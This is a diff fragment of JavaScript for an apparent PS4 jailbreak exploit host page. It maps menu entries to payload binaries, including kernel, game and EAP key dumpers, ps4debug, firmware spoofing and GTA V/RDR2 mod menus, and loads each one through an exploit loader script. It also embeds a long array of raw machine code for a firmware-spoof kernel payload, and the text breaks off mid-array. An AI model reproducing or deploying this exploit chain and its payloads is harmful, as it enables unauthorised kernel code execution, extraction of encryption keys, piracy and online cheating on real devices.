+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading History Blocker ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==11){//load updatesdisable
+	 PLfile="pl_updatesDisable.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Update Disable ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==12){//load updatesenable
+	 PLfile="pl_updatesEnable.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Update Enable ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==13){//load dbBackup
+	 PLfile="dbBackup.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading DB Backup ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==14){//load dbRestore
+	 PLfile="dbRestore.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading DB Restore ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==15){//load TrophyBackup
+	 PLfile="pl_Trophy_Backup_With_Screenshots.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Trophy Backup+Screenshots ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==16){//load TrophyRestore
+	 PLfile="pl_Trophy_Restore_With_Screenshots.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Trophy Restore+Screenshots ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==17){//load remoteplay
+	 PLfile="pl_mira_unofficial.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading RemotePlay ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==18){//load todex
+	 PLfile="pl_ToDEX.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading ToDEX ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==19){//load todev
+	 PLfile="pl_ToDEV.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading ToDEV ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==20){//load tokratos
+	 PLfile="pl_ToKratos.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading ToKratos ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==21){//load ps4debug
+	 PLfile="pl_ps4debug.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading PS4debug ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==22){//load fakeusb
+	 PLfile="pl_fakeusb.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading FakeUSB ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==23){//load webrtw
+	 PLfile="WebRTE.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading WebRTE ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==24){//load fan control
+	 msgs2.innerHTML="<div>Loading Fan Control ...</div>";
+      setTimeout(function(){
+       msgs2.style.display="none";
+       temp.style.display="inline";
+      },1000);}
+	 if(key==25){//load Spoofer
+	 SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Firmware Spoof ...</div>"; 
+	 fw1=parseInt(fws1.value,16);fw2=parseInt(fws2.value,16);
+	 spoof();
+     var script = document.createElement('script');script.src = "pl_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+     }
+	 if(key==26){//load EAP Key Dumper
+	 PLfile="EAP.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading EAP Key Dumper ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key==27){//load linux
+	 PLfile="pl_linux.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Linux From USB ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==28){//load Linux Baikal
+	 PLfile="linuxbaikal.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Linux Baikal ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==29){//load Linux HDD
+	 PLfile="linuxhdd.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Linux From Internal HDD ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==30){//load RifRenamer
+	 PLfile="rifrenamer.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Rifrenaimer ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);} 
+	 if(key==31){
+       this.isPayloadShow=false;
+       this.isDumperShow=true;
+       this.isGtaShow=false;
+       document.getElementById("detail").style.marginTop="23%"
+     }
+	 
+	 if(key==32){
+       this.isPayloadShow=false;
+       this.isDumperShow=false;
+       this.isGtaShow=true;
+       document.getElementById("detail").style.marginTop="23%"
+     }	
+
+     
+	 if(key==33){//load Web Activator
+	 payloads.style.display = 'none';detail.style.display = 'none';msgs2.innerHTML="<div>Loading Web Activator ...</div>"; 
+     var script = document.createElement('script');script.src = "payload.js";document.getElementsByTagName('head')[0].appendChild(script); 
+     var script = document.createElement('script');script.src = "pl_loader2.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     
+     if(key==34){
+      window.location.href = "http://night-king.rf.gd/index.html";
+     }
+	 
+	 
+     if(key=="dum0"){//load Dumper
+	 PLfile="pl_DumperG.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Game Dumper ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);} 
+     if(key=="dum1"){//load Dumper
+	 PLfile="pl_DumperU.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Update Dumper ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);} 
+     if(key=="dum2"){//load Dumper
+	 PLfile="pl_DumperGU.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading G+U Dumper ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);} 
+     if(key=="dum3"){//load Dumper
+	 PLfile="pl_DumperM.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading G+U.M Dumper ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key=="dum4"){//load Dumper
+	 PLfile="pl_kernelDumper.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Kernel Dumper ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	
+	 if(key=="gta0"){//load GTAV
+	 PLfile="GTAV100.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading ArabicGuy V1.00 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);} 
+     if(key=="gta1"){//load GTAV
+	 PLfile="GTAV127.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading ArabicGuy V1.27 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);} 
+     if(key=="gta2"){//load GTAV
+	 PLfile="GTA132.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading GTAV ArabicGuy V1.32 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);} 
+     if(key=="gta3"){//load GTAV
+	 PLfile="GTAVLamance132.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading GTAV Lamance V1.32 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key=="gta4"){//load GTAV
+	 PLfile="GTAVBeefQueefMod132.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading GTAV BeefQueef V1.32 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key=="gta5"){//load GTAV
+	 PLfile="GTAVBeefQueefMod133.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading GTAV BeefQueef V1.33 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+   
+     if(key=="gta6"){//load RDR2
+	 PLfile="RDR2_V113.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading RDR2 V1.13 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+     if(key=="gta7"){//load RDR2
+	 PLfile="RDR2_V119.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading RDR2 V1.19 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key=="gta8"){//load RDR2
+	 PLfile="RDR2_V124.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading RDR2 V1.24 - After Payload Loaded Press PS Button And Launch The Game ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+  
+
+  },
+    showMain:function(){
+     this.isPayloadShow = true
+     this.isGtaShow = false
+     this.isDumperShow = false
+     this.isThemesShow = false
+     this.isAboutUsShow = false
+     this.isLoaderShow = true
+	   this.isDonationShow = false
+     document.getElementById("detail").style.marginTop="1%"
+    },
+    showTheme:function(){
+     this.isLoaderShow = false
+     this.isAboutUsShow = false
+     this.isThemesShow = true
+     this.isPayloadShow = false
+	   this.isDonationShow = false
+     this.isGtaShow = false
+     this.isDumperShow = false
+    },
+    showAboutUs:function(){
+     this.isPayloadShow=false
+     this.isAboutUsShow = true
+     this.isLoaderShow = false
+     this.isThemesShow = false
+	   this.isDonationShow = false
+     this.isGtaShow = false
+     this.isDumperShow = false
+    },
+    showDonation:function(){
+     this.isPayloadShow=false
+     this.isAboutUsShow = false
+     this.isLoaderShow = false
+     this.isThemesShow = false
+	   this.isDonationShow = true
+     this.isGtaShow = false
+     this.isDumperShow = false
+    },
+    changeTheme:function(key){
+     this.themes[this.selectedTheme].selected=false
+     localStorage.setItem("theme",(key))
+     this.selectedTheme=localStorage.getItem("theme")
+     this.themes[this.selectedTheme].selected=true
+     if(this.themes[this.selectedTheme].animated){
+     this.isAnimate1Show=true
+     }else{
+      this.isAnimate1Show=false
+      document.getElementById("body").style.background="url("+this.themes[localStorage.getItem("theme")].url+")";
+      document.getElementById("body").style.backgroundRepeat="no-repeat";
+      document.getElementById("body").style.backgroundSize="100%";
+     }
+    },
+    changeLang:function(lang){
+     localStorage.setItem("lang",lang)
+     this.lang=localStorage.getItem("lang")
+    },
+    changeText:function(tfa,teng,tesp){
+     if(this.lang=="fa"){
+      return tfa;
+     }
+     if(this.lang=="eng"){
+      return teng;
+     }
+     return "error to change lang";
+    },
+    hover:function(key){
+     if(key !== undefined){
+      var chars = key.toString().substring(0,3);
+      var nums = key.toString().substring(3)
+      this.isDetailShow = true
+      if(this.lang=="fa"){
+       if(chars=="gta"){
+        document.getElementById("detail").innerHTML=this.GTA[nums].fa_detail;
+       } else if (chars=="dum") {
+        document.getElementById("detail").innerHTML=this.DUMPER[nums].fa_detail;
+
+       }
+       
+       else{
+        document.getElementById("detail").innerHTML=this.payloads[key].fa_detail;
+       }
+      }
+      if(this.lang=="eng"){
+        if(chars=="gta"){
+        document.getElementById("detail").innerHTML=this.GTA[nums].eng_detail;
+       } else if(chars=="dum"){
+        document.getElementById("detail").innerHTML=this.DUMPER[nums].eng_detail;
+       }
+       else{
+        document.getElementById("detail").innerHTML=this.payloads[key].eng_detail;
+       }
+      }
+     }else{
+      this.isDetailShow = false
+     }
+    },
+    setTemp:function(){
+	  SALT.style.display = 'block';
+	  payloads.style.display = 'none';
+	  detail.style.display = 'none';
+	  msgs2.innerHTML="<div>Status</div>";
+	  fanTemp=tempC.value;
+	  PLfile="pl_fanthresh.bin";
+      txt0.innerHTML="<div>Fan Control Loading...</div>";
+      var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+    },
+    retLang:function(){
+     return this.lang;
+    },
+    Backhover:function(){
+       this.isDetailShow = true
+      if(this.lang=="fa"){
+       document.getElementById("detail").innerHTML="بازگشت به منوی اصلی"
+      
+      }
+      if(this.lang=="eng"){
+        document.getElementById("detail").innerHTML="Return to the main menu"
+      }
+    }
+   },
+   
+   created(){
+    this.themes[this.selectedTheme].selected=true
+    this.changeTheme(this.selectedTheme)
+    
+   },
+   loadtrainer:function(){
+   var link = document.createElement('a');
+   document.body.appendChild(link);
+   link.href = 'http://night-king-host.com/Trainer/index.html';
+   link.click();}
+   
+  })
+    function preweb(){
+    var script = document.createElement('script');script.src = "frontend.js";document.getElementsByTagName('head')[0].appendChild(script);
+    }
+	function spoof() {var payload = [233,14,0,0,0,72,137,254,191,222,0,0,0,255,37,5,20,0,0,83,72,137,251,232,27,10,0,0,232,108,4,0,0,72,141,53,49,0,0,0,72,137,218,191,11,0,0,0,49,192,232,185,13,0,0,232,189,0,0,0,72,141,61,219,13,0,0,232,189,255,255,255,49,192,91,195,72,137,249,15,50,72,193,226,32,72,9,208,195,72,139,71,8,185,130,0,0,192,72,139,112,64,76,139,64,72,15,50,72,137,209,72,139,150,24,1,0,0,72,193,225,32,72,9,200,72,45,192,1,0,0,199,70,4,0,0,0,0,199,70,8,0,0,0,0,72,131,201,255,199,70,20,0,0,0,0,199,2,0,0,0,0,72,139,144,24,229,19,1,72,137,86,48,72,139,144,32,3,48,2,73,137,80,32,73,137,80,24,72,139,151,48,1,0,0,72,191,19,0,0,0,0,0,1,56,72,137,74,96,72,137,122,88,72,137,74,104,15,32,194,72,137,209,72,129,225,255,255,254,255,15,34,193,199,128,72,66,168,1,33,128,fw2,fw1,15,34,194,49,192,195,85,83,69,49,201,80,69,49,192,49,201,49,210,49,246,72,141,61,33,13,0,0,255,21,211,21,0,0,49,201,69,49,201,137,197,69,49,192,49,210,49,246,72,141,61,44,13,0,0,255,21,184,21,0,0,137,239,72,141,21,223,18,0,0,137,195,72,141,53,64,13,0,0,232,58,8,0,0,89,137,223,91,72,141,21,222,18,0,0,93,72,141,53,81,13,0,0,233,34,8,0,0,83,72,137,250,72,129,236,0,2,0,0,72,141,53,91,13,0,0,72,137,231,49,192,255,21,84,20,0,0,72,137,230,191,129,0,0,0,255,21,142,18,0,0,72,129,196,0,2,0,0,91,195,49,246,255,37,149,18,0,0,83,69,49,201,72,131,236,16,69,49,192,49,201,49,210,49,246,72,141,61,35,13,0,0,255,21,47,21,0,0,72,141,21,96,18,0,0,72,141,53,57,13,0,0,137,195,137,199,232,177,7,0,0,72,141,21,105,18,0,0,72,141,53,59,13,0,0,137,223,232,156,7,0,0,72,141,21,92,18,0,0,72,141,53,71,13,0,0,137,223,232,135,7,0,0,49,255,255,21,30,18,0,0,133,192,117,19,72,137,231,255,21,49,18,0,0,133,192,117,6,255,21,47,18,0,0,72,139,4,36,72,139,84,36,8,72,131,196,16,91,195,83,69,49,201,72,131,236,16,69,49,192,49,201,49,210,49,246,72,141,61,150,12,0,0,255,21,162,20,0,0,72,141,21,211,17,0,0,72,141,53,172,12,0,0,137,195,137,199,232,36,7,0,0,72,141,21,220,17,0,0,72,141,53,174,12,0,0,137,223,232,15,7,0,0,72,141,21,207,17,0,0,72,141,53,186,12,0,0,137,223,232,250,6,0,0,49,255,255,21,145,17,0,0,133,192,116,5,131,200,255,235,28,72,137,231,255,21,159,17,0,0,133,192,117,238,131,60,36,255,116,232,255,21,151,17,0,0,139,4,36,72,131,196,16,91,195,65,84,85,83,65,137,252,72,131,236,32,191,16,0,0,0,255,21,192,17,0,0,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,243,11,0,0,72,137,197,255,21,252,19,0,0,72,141,21,45,17,0,0,72,141,53,6,12,0,0,137,195,137,199,232,126,6,0,0,72,141,21,46,17,0,0,72,141,53,65,12,0,0,137,223,232,105,6,0,0,72,141,21,41,17,0,0,72,141,53,20,12,0,0,137,223,232,84,6,0,0,49,255,255,21,235,16,0,0,49,210,133,192,117,51,72,141,92,36,15,186,17,0,0,0,72,137,222,68,137,231,255,21,231,16,0,0,49,210,133,192,117,23,72,137,222,72,137,239,255,21,245,16,0,0,49,192,255,21,221,16,0,0,72,137,234,72,131,196,32,72,137,208,91,93,65,92,195,83,69,49,201,72,131,236,16,69,49,192,49,201,49,210,49,246,72,141,61,68,11,0,0,255,21,80,19,0,0,72,141,21,137,16,0,0,72,141,53,198,11,0,0,137,195,137,199,232,210,5,0,0,72,141,21,106,16,0,0,72,141,53,67,11,0,0,137,223,232,189,5,0,0,72,141,21,125,16,0,0,72,141,53,104,11,0,0,137,223,232,168,5,0,0,49,255,255,21,63,16,0,0,133,192,117,25,72,141,124,36,12,255,21,56,16,0,0,133,192,117,10,255,21,78,16,0,0,139,68,36,12,72,131,196,16,91,195,83,72,141,53,125,11,0,0,191,28,2,0,0,49,192,232,216,9,0,0,186,0,64,0,0,49,201,72,137,195,137,198,191,34,2,0,0,49,192,232,192,9,0,0,137,222,191,29,2,0,0,49,192,232,178,9,0,0,91,186,30,0,0,0,190,1,0,0,0,191,37,0,0,0,49,192,233,155,9,0,0,69,49,201,80,69,49,192,49,201,49,210,49,246,72,141,61,49,11,0,0,255,21,121,18,0,0,72,141,21,218,15,0,0,72,141,53,63,11,0,0,137,199,232,253,4,0,0,90,49,192,255,37,195,15,0,0,83,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,43,11,0,0,255,21,65,18,0,0,72,141,21,226,15,0,0,72,141,53,47,11,0,0,137,195,137,199,232,195,4,0,0,137,223,72,141,21,97,17,0,0,72,141,53,29,11,0,0,232,174,4,0,0,137,223,72,141,21,220,15,0,0,72,141,53,13,11,0,0,232,153,4,0,0,137,223,72,141,21,55,16,0,0,72,141,53,255,10,0,0,232,132,4,0,0,137,223,72,141,21,194,16,0,0,72,141,53,242,10,0,0,232,111,4,0,0,137,223,72,141,21,109,16,0,0,72,141,53,230,10,0,0,232,90,4,0,0,137,223,72,141,21,72,15,0,0,72,141,53,216,10,0,0,232,69,4,0,0,137,223,72,141,21,243,15,0,0,72,141,53,202,10,0,0,232,48,4,0,0,137,223,72,141,21,254,14,0,0,72,141,53,188,10,0,0,232,27,4,0,0,137,223,72,141,21,177,15,0,0,72,141,53,174,10,0,0,232,6,4,0,0,137,223,72,141,21,92,15,0,0,72,141,53,161,10,0,0,232,241,3,0,0,137,223,72,141,21,175,15,0,0,72,141,53,147,10,0,0,232,220,3,0,0,137,223,72,141,21,90,16,0,0,72,141,53,134,10,0,0,232,199,3,0,0,137,223,72,141,21,245,15,0,0,72,141,53,120,10,0,0,232,178,3,0,0,137,223,72,141,21,64,15,0,0,72,141,53,106,10,0,0,232,157,3,0,0,137,223,72,141,21,227,15,0,0,72,141,53,93,10,0,0,232,136,3,0,0,137,223,72,141,21,110,14,0,0,72,141,53,80,10,0,0,232,115,3,0,0,137,223,72,141,21,41,15,0,0,72,141,53,68,10,0,0,232,94,3,0,0,137,223,72,141,21,228,15,0,0,72,141,53,54,10,0,0,232,73,3,0,0,137,223,72,141,21,111,14,0,0,72,141,53,40,10,0,0,232,52,3,0,0,137,223,72,141,21,162,14,0,0,72,141,53,27,10,0,0,232,31,3,0,0,137,223,72,141,21,245,14,0,0,72,141,53,13,10,0,0,232,10,3,0,0,137,223,72,141,21,232,14,0,0,72,141,53,0,10,0,0,232,245,2,0,0,137,223,72,141,21,43,14,0,0,72,141,53,234,9,0,0,232,224,2,0,0,137,223,72,141,21,62,15,0,0,72,141,53,220,9,0,0,232,203,2,0,0,137,223,72,141,21,57,15,0,0,72,141,53,207,9,0,0,232,182,2,0,0,137,223,72,141,21,60,14,0,0,72,141,53,191,9,0,0,232,161,2,0,0,137,223,72,141,21,127,13,0,0,72,141,53,178,9,0,0,232,140,2,0,0,137,223,72,141,21,202,13,0,0,72,141,53,166,9,0,0,232,119,2,0,0,137,223,72,141,21,69,14,0,0,72,141,53,156,9,0,0,232,98,2,0,0,137,223,72,141,21,8,14,0,0,72,141,53,142,9,0,0,232,77,2,0,0,137,223,72,141,21,91,14,0,0,72,141,53,127,9,0,0,232,56,2,0,0,137,223,72,141,21,174,13,0,0,72,141,53,107,9,0,0,232,35,2,0,0,137,223,72,141,21,249,12,0,0,72,141,53,91,9,0,0,232,14,2,0,0,137,223,72,141,21,252,13,0,0,72,141,53,78,9,0,0,232,249,1,0,0,137,223,72,141,21,71,13,0,0,72,141,53,51,9,0,0,232,228,1,0,0,137,223,72,141,21,50,14,0,0,72,141,53,38,9,0,0,232,207,1,0,0,137,223,72,141,21,237,13,0,0,72,141,53,10,9,0,0,232,186,1,0,0,137,223,72,141,21,48,14,0,0,72,141,53,4,9,0,0,232,165,1,0,0,137,223,72,141,21,219,13,0,0,72,141,53,246,8,0,0,232,144,1,0,0,137,223,72,141,21,134,13,0,0,72,141,53,234,8,0,0,232,123,1,0,0,137,223,72,141,21,209,13,0,0,72,141,53,223,8,0,0,232,102,1,0,0,137,223,72,141,21,204,12,0,0,72,141,53,214,8,0,0,232,81,1,0,0,137,223,72,141,21,119,13,0,0,72,141,53,200,8,0,0,232,60,1,0,0,137,223,72,141,21,90,12,0,0,72,141,53,187,8,0,0,232,39,1,0,0,137,223,72,141,21,53,12,0,0,72,141,53,174,8,0,0,232,18,1,0,0,137,223,72,141,21,168,13,0,0,72,141,53,163,8,0,0,232,253,0,0,0,137,223,72,141,21,243,11,0,0,72,141,53,150,8,0,0,232,232,0,0,0,137,223,72,141,21,230,11,0,0,72,141,53,137,8,0,0,232,211,0,0,0,137,223,72,141,21,97,13,0,0,72,141,53,126,8,0,0,232,190,0,0,0,137,223,72,141,21,60,12,0,0,72,141,53,114,8,0,0,232,169,0,0,0,137,223,72,141,21,191,11,0,0,72,141,53,99,8,0,0,232,148,0,0,0,137,223,72,141,21,122,12,0,0,72,141,53,90,8,0,0,232,127,0,0,0,137,223,72,141,21,69,12,0,0,72,141,53,75,8,0,0,232,106,0,0,0,137,223,72,141,21,208,12,0,0,72,141,53,60,8,0,0,232,85,0,0,0,137,223,72,141,21,179,11,0,0,72,141,53,46,8,0,0,232,64,0,0,0,137,223,72,141,21,70,12,0,0,72,141,53,31,8,0,0,232,43,0,0,0,137,223,72,141,21,65,12,0,0,72,141,53,16,8,0,0,232,22,0,0,0,137,223,91,72,141,21,91,11,0,0,72,141,53,1,8,0,0,233,0,0,0,0,72,199,192,79,2,0,0,233,102,4,0,0,72,199,192,80,2,0,0,233,90,4,0,0,80,72,199,6,96,1,0,0,72,137,242,49,192,137,254,191,81,2,0,0,232,62,4,0,0,90,195,72,137,241,80,49,210,72,137,254,69,49,192,191,82,2,0,0,49,192,232,36,4,0,0,90,195,137,254,80,49,210,49,201,191,83,2,0,0,49,192,232,15,4,0,0,90,195,49,201,80,49,210,49,246,72,141,61,148,7,0,0,69,49,201,69,49,192,255,21,235,12,0,0,89,72,141,21,43,12,0,0,72,141,53,142,7,0,0,137,199,233,110,255,255,255,72,199,192,37,0,0,0,233,212,3,0,0,72,199,192,54,0,0,0,233,200,3,0,0,72,199,192,11,0,0,0,233,188,3,0,0,72,141,53,10,12,0,0,82,72,141,61,103,5,0,0,72,199,5,119,12,0,0,0,0,0,0,232,94,255,255,255,133,192,116,42,72,141,53,231,11,0,0,72,141,61,73,7,0,0,232,71,255,255,255,133,192,116,19,72,141,53,208,11,0,0,72,141,61,69,7,0,0,232,48,255,255,255,139,61,190,11,0,0,72,141,21,191,11,0,0,72,141,53,63,7,0,0,232,228,254,255,255,139,61,165,11,0,0,72,141,21,230,11,0,0,72,141,53,56,7,0,0,232,203,254,255,255,139,61,140,11,0,0,72,141,21,5,12,0,0,72,141,53,48,7,0,0,232,178,254,255,255,139,61,115,11,0,0,72,141,21,204,11,0,0,72,141,53,31,7,0,0,232,153,254,255,255,139,61,90,11,0,0,72,141,21,243,11,0,0,72,141,53,21,7,0,0,232,128,254,255,255,139,61,65,11,0,0,72,141,21,2,12,0,0,72,141,53,21,7,0,0,232,103,254,255,255,139,61,40,11,0,0,72,141,21,113,11,0,0,72,141,53,26,7,0,0,232,78,254,255,255,139,61,15,11,0,0,72,141,21,24,11,0,0,72,141,53,26,7,0,0,232,53,254,255,255,139,61,246,10,0,0,72,141,21,135,11,0,0,72,141,53,30,7,0,0,232,28,254,255,255,139,61,221,10,0,0,72,141,21,198,11,0,0,72,141,53,19,7,0,0,232,3,254,255,255,139,61,196,10,0,0,72,141,21,45,11,0,0,72,141,53,8,7,0,0,232,234,253,255,255,139,61,171,10,0,0,72,141,21,52,11,0,0,72,141,53,253,6,0,0,232,209,253,255,255,139,61,146,10,0,0,72,141,21,51,11,0,0,72,141,53,243,6,0,0,232,184,253,255,255,139,61,121,10,0,0,72,141,21,154,10,0,0,72,141,53,233,6,0,0,232,159,253,255,255,139,61,96,10,0,0,72,141,21,41,11,0,0,72,141,53,223,6,0,0,232,134,253,255,255,139,61,71,10,0,0,72,141,21,48,10,0,0,72,141,53,214,6,0,0,232,109,253,255,255,139,61,46,10,0,0,72,141,21,223,10,0,0,72,141,53,211,6,0,0,232,84,253,255,255,139,61,21,10,0,0,72,141,21,62,10,0,0,72,141,53,210,6,0,0,232,59,253,255,255,139,61,252,9,0,0,72,141,21,93,10,0,0,72,141,53,208,6,0,0,232,34,253,255,255,139,61,227,9,0,0,72,141,21,228,10,0,0,72,141,53,190,6,0,0,232,9,253,255,255,139,61,202,9,0,0,72,141,21,27,10,0,0,72,141,53,178,6,0,0,232,240,252,255,255,139,61,177,9,0,0,72,141,21,194,9,0,0,72,141,53,161,6,0,0,232,215,252,255,255,139,61,152,9,0,0,72,141,21,113,10,0,0,72,141,53,143,6,0,0,232,190,252,255,255,139,61,127,9,0,0,72,141,21,40,10,0,0,72,141,53,131,6,0,0,232,165,252,255,255,139,61,102,9,0,0,72,141,21,71,10,0,0,72,141,53,129,6,0,0,232,140,252,255,255,139,61,77,9,0,0,72,141,21,126,9,0,0,72,141,53,126,6,0,0,232,115,252,255,255,139,61,52,9,0,0,72,141,21,5,10,0,0,72,141,53,123,6,0,0,232,90,252,255,255,139,61,27,9,0,0,72,141,21,20,10,0,0,72,141,53,120,6,0,0,232,65,252,255,255,139,61,2,9,0,0,72,141,21,59,9,0,0,72,141,53,117,6,0,0,232,40,252,255,255,139,61,233,8,0,0,72,141,21,218,8,0,0,72,141,53,99,6,0,0,232,15,252,255,255,139,61,208,8,0,0,72,141,21,233,8,0,0,72,141,53,81,6,0,0,232,246,251,255,255,139,61,183,8,0,0,72,141,21,168,9,0,0,72,141,53,63,6,0,0,232,221,251,255,255,139,61,158,8,0,0,72,141,21,31,9,0,0,72,141,53,45,6,0,0,232,196,251,255,255,139,61,133,8,0,0,72,141,21,62,9,0,0,72,141,53,27,6,0,0,232,171,251,255,255,139,61,108,8,0,0,72,141,21,221,8,0,0,88,72,141,5